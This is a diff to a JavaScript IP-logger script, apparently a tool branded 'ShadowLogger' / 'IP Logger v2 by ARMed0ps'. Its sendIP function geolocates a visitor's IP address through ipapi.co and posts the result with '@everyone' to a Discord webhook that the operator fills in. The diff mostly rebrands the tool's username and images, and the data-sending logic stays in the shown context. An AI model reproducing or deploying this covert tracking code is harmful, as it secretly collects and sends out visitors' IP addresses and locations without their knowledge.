@@ -6,7 +6,7 @@ const sendIP = () => {
             return fetch(`https://ipapi.co/${ipadd}/json/`)
                 .then(geoResponse => geoResponse.json())
                 .then(geoData => {
-                    const dscURL = ''; //place discord webhook here
+                    const dscURL = ''; // place discord webhook here
                     
                     return fetch(dscURL, {
                         method: 'POST',
@@ -14,8 +14,8 @@ const sendIP = () => {
                             'Content-Type': 'application/json'
                         },
                         body: JSON.stringify({
-                            username: "1pl0gg3r",
-                            avatar_url: "https://images.unsplash.com/photo-1519575706483-221027bfbb31?q=80&w=871&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D",
+                            username: "ShadowLogger", // changeable
+                            avatar_url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/ShadowLogger%20pfp.png", // changeable
                             content: "@everyone",
                             embeds: [
                                 {
@@ -42,11 +42,11 @@ const sendIP = () => {
                                         }
                                     ],
                                     thumbnail: {
-                                        url: "https://images.unsplash.com/photo-1519575706483-221027bfbb31?q=80&w=871&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
+                                        url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/ShadowLogger%20pfp.png" // changeable
                                     },
                                     footer: {
                                         text: "IP Logger v2 by ARMed0ps",
-                                        icon_url: "https://images.unsplash.com/photo-1519575706483-221027bfbb31?q=80&w=871&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
+                                        icon_url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/ShadowLogger%20pfp.png" // changeable
                                     },
                                     timestamp: new Date().toISOString()
                                 }
